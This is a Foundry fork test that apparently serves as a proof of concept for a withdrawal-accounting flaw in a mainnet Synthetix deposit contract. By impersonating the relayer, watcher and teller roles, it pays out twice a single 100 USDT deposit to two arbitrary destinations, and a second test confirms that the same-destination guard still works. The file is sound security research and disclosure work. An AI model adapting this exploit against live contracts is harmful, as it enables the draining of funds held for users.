// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface ISignatureTransferLike {
    struct TokenPermissions {
        address token;
        uint256 amount;
    }

    struct PermitTransferFrom {
        TokenPermissions permitted;
        uint256 nonce;
        uint256 deadline;
    }
}

interface ISynthetixDepositLike {
    enum Status {
        Requested,
        Validated,
        Disbursed,
        Denied,
        Disputed,
        Cancelled,
        Expired
    }

    struct PermitDetails {
        ISignatureTransferLike.PermitTransferFrom permit;
        bytes signature;
    }

    struct DepositEntry {
        address token;
        uint256 amount;
        address beneficiary;
        uint256 subAccountId;
        PermitDetails permitDetails;
    }

    struct WithdrawalEntry {
        address[] tokens;
        uint256[] amounts;
        address beneficiary;
    }

    struct WithdrawalRequest {
        address user;
        Status status;
        uint8 watcherCount;
        uint32 requestTime;
        uint32 processedTime;
        uint16 reasonCode;
        address[] tokens;
        uint256[] amounts;
    }

    error ActiveWithdrawalExists();

    function deposit(DepositEntry[] calldata deposits) external;
    function requestWithdrawal(WithdrawalEntry[] calldata withdrawals) external;
    function castWatcherVotes(uint256[] calldata requestIds) external;
    function disburseWithdrawals(uint256[] calldata requestIds) external;

    function RELAYER_ROLE() external view returns (bytes32);
    function WATCHER_ROLE() external view returns (bytes32);
    function TELLER_ROLE() external view returns (bytes32);
    function watcherQuorum() external view returns (uint256);
    function getRoleMemberCount(bytes32 role) external view returns (uint256);
    function getRoleMember(bytes32 role, uint256 index) external view returns (address);

    function getWithdrawalRequestCounter() external view returns (uint256);
    function getWithdrawalRequest(uint256 id) external view returns (WithdrawalRequest memory);
    function getActiveWithdrawalId(address user) external view returns (uint256);
    function getUserBalance(address user, address token) external view returns (int256);
    function getTotalDeposited(address token) external view returns (uint256);
}

contract SynthetixWithdrawalOvercommitForkTest is Test {
    address internal constant DEPOSIT_PROXY = 0xD62595c3c23B690BAEE0935e107A209Cb1Dbd37B;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 internal constant PRINCIPAL = 100_000_000; // 100 USDT

    ISynthetixDepositLike internal constant depositContract = ISynthetixDepositLike(DEPOSIT_PROXY);
    IERC20Like internal constant usdt = IERC20Like(USDT);

    address internal owner;
    address internal destinationA;
    address internal destinationB;
    address internal relayer;
    address internal teller;
    bytes32 internal watcherRole;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        owner = makeAddr("synthetic-account-owner");
        destinationA = makeAddr("withdrawal-destination-a");
        destinationB = makeAddr("withdrawal-destination-b");

        bytes32 relayerRole = depositContract.RELAYER_ROLE();
        watcherRole = depositContract.WATCHER_ROLE();
        bytes32 tellerRole = depositContract.TELLER_ROLE();

        assertGt(depositContract.getRoleMemberCount(relayerRole), 0, "no relayer on fork");
        assertGt(depositContract.getRoleMemberCount(watcherRole), 0, "no watcher on fork");
        assertGt(depositContract.getRoleMemberCount(tellerRole), 0, "no teller on fork");

        relayer = depositContract.getRoleMember(relayerRole, 0);
        teller = depositContract.getRoleMember(tellerRole, 0);

        _depositSyntheticPrincipal();

        console2.log("fork block", block.number);
        console2.log("relayer", relayer);
        console2.log("teller", teller);
        console2.log("watcher quorum", depositContract.watcherQuorum());
    }

    function testDistinctDestinationsPermitTwoFullPrincipalWithdrawals() public {
        uint256 requestCounterBefore = depositContract.getWithdrawalRequestCounter();
        uint256 contractBalanceBefore = usdt.balanceOf(DEPOSIT_PROXY);
        uint256 trackedTotalBefore = depositContract.getTotalDeposited(USDT);
        uint256 destinationABefore = usdt.balanceOf(destinationA);
        uint256 destinationBBefore = usdt.balanceOf(destinationB);

        assertEq(depositContract.getUserBalance(owner, USDT), int256(PRINCIPAL), "synthetic deposit not credited");
        assertEq(depositContract.getUserBalance(destinationA, USDT), 0, "destination A unexpectedly credited");
        assertEq(depositContract.getUserBalance(destinationB, USDT), 0, "destination B unexpectedly credited");

        ISynthetixDepositLike.WithdrawalEntry[] memory withdrawals =
            new ISynthetixDepositLike.WithdrawalEntry[](2);
        withdrawals[0] = _withdrawal(destinationA, PRINCIPAL);
        withdrawals[1] = _withdrawal(destinationB, PRINCIPAL);

        vm.prank(relayer);
        depositContract.requestWithdrawal(withdrawals);

        uint256 requestA = requestCounterBefore + 1;
        uint256 requestB = requestCounterBefore + 2;
        uint256[] memory requestIds = new uint256[](2);
        requestIds[0] = requestA;
        requestIds[1] = requestB;

        ISynthetixDepositLike.WithdrawalRequest memory storedA = depositContract.getWithdrawalRequest(requestA);
        ISynthetixDepositLike.WithdrawalRequest memory storedB = depositContract.getWithdrawalRequest(requestB);

        assertEq(storedA.user, destinationA, "request A keyed to wrong destination");
        assertEq(storedB.user, destinationB, "request B keyed to wrong destination");
        assertEq(uint256(storedA.status), uint256(ISynthetixDepositLike.Status.Requested));
        assertEq(uint256(storedB.status), uint256(ISynthetixDepositLike.Status.Requested));
        assertEq(depositContract.getActiveWithdrawalId(destinationA), requestA);
        assertEq(depositContract.getActiveWithdrawalId(destinationB), requestB);

        _validate(requestIds);

        storedA = depositContract.getWithdrawalRequest(requestA);
        storedB = depositContract.getWithdrawalRequest(requestB);
        assertEq(uint256(storedA.status), uint256(ISynthetixDepositLike.Status.Validated));
        assertEq(uint256(storedB.status), uint256(ISynthetixDepositLike.Status.Validated));

        vm.prank(teller);
        depositContract.disburseWithdrawals(requestIds);

        assertEq(usdt.balanceOf(destinationA) - destinationABefore, PRINCIPAL, "destination A payout mismatch");
        assertEq(usdt.balanceOf(destinationB) - destinationBBefore, PRINCIPAL, "destination B payout mismatch");
        assertEq(contractBalanceBefore - usdt.balanceOf(DEPOSIT_PROXY), PRINCIPAL * 2, "custody outflow mismatch");
        assertEq(trackedTotalBefore - depositContract.getTotalDeposited(USDT), PRINCIPAL * 2, "tracked outflow mismatch");

        // The only synthetic economic deposit remains credited to its owner because the
        // withdrawal request contains no source owner/subaccount. Instead, both arbitrary
        // payout destinations acquire negative onchain ledgers.
        assertEq(depositContract.getUserBalance(owner, USDT), int256(PRINCIPAL), "owner ledger was consumed");
        assertEq(depositContract.getUserBalance(destinationA, USDT), -int256(PRINCIPAL));
        assertEq(depositContract.getUserBalance(destinationB, USDT), -int256(PRINCIPAL));

        storedA = depositContract.getWithdrawalRequest(requestA);
        storedB = depositContract.getWithdrawalRequest(requestB);
        assertEq(uint256(storedA.status), uint256(ISynthetixDepositLike.Status.Disbursed));
        assertEq(uint256(storedB.status), uint256(ISynthetixDepositLike.Status.Disbursed));

        console2.log("synthetic principal deposited", PRINCIPAL);
        console2.log("aggregate payout", PRINCIPAL * 2);
        console2.logInt(depositContract.getUserBalance(owner, USDT));
        console2.logInt(depositContract.getUserBalance(destinationA, USDT));
        console2.logInt(depositContract.getUserBalance(destinationB, USDT));
    }

    function testSameDestinationIsRejectedByActiveWithdrawalGuard() public {
        uint256 requestCounterBefore = depositContract.getWithdrawalRequestCounter();

        ISynthetixDepositLike.WithdrawalEntry[] memory withdrawals =
            new ISynthetixDepositLike.WithdrawalEntry[](2);
        withdrawals[0] = _withdrawal(destinationA, PRINCIPAL);
        withdrawals[1] = _withdrawal(destinationA, PRINCIPAL);

        vm.expectRevert(ISynthetixDepositLike.ActiveWithdrawalExists.selector);
        vm.prank(relayer);
        depositContract.requestWithdrawal(withdrawals);

        // Entire batch reverts. This negative control isolates the bypass to the use of
        // payout destination as the active-withdrawal key.
        assertEq(depositContract.getWithdrawalRequestCounter(), requestCounterBefore);
        assertEq(depositContract.getActiveWithdrawalId(destinationA), 0);
    }

    function _depositSyntheticPrincipal() internal {
        deal(USDT, owner, PRINCIPAL, true);

        vm.startPrank(owner);
        usdt.approve(DEPOSIT_PROXY, PRINCIPAL);

        ISignatureTransferLike.TokenPermissions memory permissions =
            ISignatureTransferLike.TokenPermissions({token: address(0), amount: 0});
        ISignatureTransferLike.PermitTransferFrom memory emptyPermit = ISignatureTransferLike.PermitTransferFrom({
            permitted: permissions,
            nonce: 0,
            deadline: 0
        });
        ISynthetixDepositLike.PermitDetails memory permitDetails =
            ISynthetixDepositLike.PermitDetails({permit: emptyPermit, signature: bytes("")});

        ISynthetixDepositLike.DepositEntry[] memory entries = new ISynthetixDepositLike.DepositEntry[](1);
        entries[0] = ISynthetixDepositLike.DepositEntry({
            token: USDT,
            amount: PRINCIPAL,
            beneficiary: owner,
            subAccountId: 424242,
            permitDetails: permitDetails
        });
        depositContract.deposit(entries);
        vm.stopPrank();
    }

    function _withdrawal(address beneficiary, uint256 amount)
        internal
        pure
        returns (ISynthetixDepositLike.WithdrawalEntry memory entry)
    {
        address[] memory tokens = new address[](1);
        tokens[0] = USDT;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        entry = ISynthetixDepositLike.WithdrawalEntry({tokens: tokens, amounts: amounts, beneficiary: beneficiary});
    }

    function _validate(uint256[] memory requestIds) internal {
        uint256 quorum = depositContract.watcherQuorum();
        uint256 watcherCount = depositContract.getRoleMemberCount(watcherRole);
        assertGt(quorum, 0, "watcher quorum is zero");
        assertGe(watcherCount, quorum, "not enough watchers");

        for (uint256 i = 0; i < quorum; ++i) {
            address watcher = depositContract.getRoleMember(watcherRole, i);
            vm.prank(watcher);
            depositContract.castWatcherVotes(requestIds);
        }
    }
}
